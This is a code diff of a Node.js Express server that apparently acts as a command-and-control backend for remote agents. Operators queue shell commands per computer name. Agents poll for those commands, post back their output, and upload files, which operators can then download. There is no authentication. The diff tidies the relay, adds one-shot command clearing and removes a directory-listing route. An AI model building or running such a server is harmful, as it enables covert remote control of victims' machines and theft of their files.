@@ -1,77 +1,97 @@
-const express = require('express');
+const express = require("express");
 const app = express();
 
 app.use(express.json());
 
 let commands = {};
-
-app.get('/', (req, res) => {
-    res.send("Server is running");
-});
-
-app.get('/api/get-command', (req, res) => {
-    const pc = req.query.pc;
-    res.json({ command: commands[pc] || null });
-});
-
-app.post('/api/send-command', (req, res) => {
-    const { computer, command } = req.body;
-    commands[computer] = command;
-    res.send("Command sent");
-});
-
 let outputs = {};
+let files = {};
 
-// Receive output from agent
-app.post('/api/upload', (req, res) => {
-    const { computer, output } = req.body;
-    outputs[computer] = output;
-    res.send("Output received");
+// -----------------------------
+// 🟢 TEST API
+// -----------------------------
+app.get("/", (req, res) => {
+  res.json({ command: null });
 });
 
-// View output
-app.get('/api/get-output', (req, res) => {
-    const pc = req.query.pc;
-    res.json({ output: outputs[pc] || null });
+// -----------------------------
+// 📥 SEND COMMAND
+// -----------------------------
+app.post("/api/send-command", (req, res) => {
+  const { computer, command } = req.body;
+
+  if (!computer || !command) {
+    return res.status(400).send("Invalid request");
+  }
+
+  commands[computer] = command;
+  res.send("Command sent");
 });
+
+// -----------------------------
+// 📤 GET COMMAND (AGENT CALLS)
+// -----------------------------
+app.get("/api/get-command", (req, res) => {
+  const pc = req.query.pc;
+
+  if (!pc) return res.json({ command: null });
+
+  const cmd = commands[pc] || null;
+
+  // Clear command after sending (important)
+  commands[pc] = null;
+
+  res.json({ command: cmd });
+});
+
+// -----------------------------
+// 📤 RECEIVE OUTPUT
+// -----------------------------
+app.post("/api/send-output", (req, res) => {
+  const { computer, output } = req.body;
+
+  outputs[computer] = output;
+  res.send("Output received");
+});
+
+// -----------------------------
+// 📥 GET OUTPUT
+// -----------------------------
+app.get("/api/get-output", (req, res) => {
+  const pc = req.query.pc;
+
+  res.json({
+    output: outputs[pc] || null
+  });
+});
+
+// -----------------------------
+// 📤 RECEIVE FILE
+// -----------------------------
+app.post("/api/upload-file", (req, res) => {
+  const { computer, filename, content } = req.body;
+
+  files[computer] = {
+    filename,
+    content
+  };
+
+  res.send("File received");
+});
+
+// -----------------------------
+// 📥 DOWNLOAD FILE
+// -----------------------------
+app.get("/api/download-file", (req, res) => {
+  const pc = req.query.pc;
+
+  if (!files[pc]) {
+    return res.send("No file available");
+  }
+
+  res.json(files[pc]);
+});
+
+// -----------------------------
 const PORT = process.env.PORT || 3000;
-
-app.listen(PORT, '0.0.0.0', () => {
-    console.log(`Server running on port ${PORT}`);
-});
-const fs = require('fs');
-const path = require('path');
-
-// List files
-app.get('/api/list-files', (req, res) => {
-    const dirPath = req.query.path || "C:\\";
-    try {
-        const files = fs.readdirSync(dirPath);
-        res.json(files);
-    } catch (err) {
-        res.status(500).send("Error reading directory");
-    }
-});
-// Store file content
-let fileStore = {};
-
-// Receive file data
-app.post('/api/upload-file', (req, res) => {
-    const { computer, filename, content } = req.body;
-    fileStore[computer] = { filename, content };
-    res.send("File received");
-});
-
-// Download file
-app.get('/api/download-file', (req, res) => {
-    const pc = req.query.pc;
-
-    if (!fileStore[pc]) {
-        return res.send("No file available");
-    }
-
-    const file = fileStore[pc];
-
-    res.setHeader('Content-Disposition', `attachment; filename=${file.filename}`);
-    res.send(file.content);
-});
+app.listen(PORT, () => console.log("Server running on port " + PORT));
